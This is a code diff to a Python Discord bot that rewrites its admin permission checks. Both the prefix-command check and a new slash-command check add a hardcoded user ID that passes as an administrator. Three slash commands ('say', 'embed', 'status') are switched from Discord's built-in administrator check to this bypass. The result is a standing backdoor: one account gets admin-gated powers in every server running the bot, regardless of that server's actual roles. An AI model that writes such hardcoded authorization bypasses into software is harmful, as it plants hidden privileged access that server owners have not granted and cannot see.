@@ -41,11 +41,20 @@ async def on_ready():
     await tree.sync()
     print("Slash commands refreshed.")
 
-# 🛡️ Admin Check
+# 🛡️ Admin Check (includes user ID 843061674378002453)
 def is_admin():
     async def predicate(ctx):
-        return ctx.author.guild_permissions.administrator
+        return (
+            ctx.author.guild_permissions.administrator
+            or ctx.author.id == 843061674378002453
+        )
     return commands.check(predicate)
+
+def slash_admin_check(interaction: discord.Interaction):
+    return (
+        interaction.user.guild_permissions.administrator
+        or interaction.user.id == 843061674378002453
+    )
 
 # 📘 Help Command
 @bot.command()
@@ -158,19 +167,19 @@ async def slash_ping(interaction: discord.Interaction):
     await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms")
 
 @tree.command(name="say", description="Say something as the bot")
-@app_commands.checks.has_permissions(administrator=True)
+@app_commands.check(slash_admin_check)
 async def slash_say(interaction: discord.Interaction, message: str):
     await interaction.response.send_message(message)
 
 @tree.command(name="embed", description="Send an embed")
-@app_commands.checks.has_permissions(administrator=True)
+@app_commands.check(slash_admin_check)
 async def slash_embed(interaction: discord.Interaction, title: str, description: str):
     em = discord.Embed(title=title, description=description, color=discord.Color.green())
     await interaction.response.send_message(embed=em)
 
 @tree.command(name="status", description="Change the bot's status")
 @app_commands.describe(type="Type: playing, watching, listening, competing", message="Status message")
-@app_commands.checks.has_permissions(administrator=True)
+@app_commands.check(slash_admin_check)
 async def slash_status(interaction: discord.Interaction, type: str, message: str):
     type = type.lower()
     activity = None
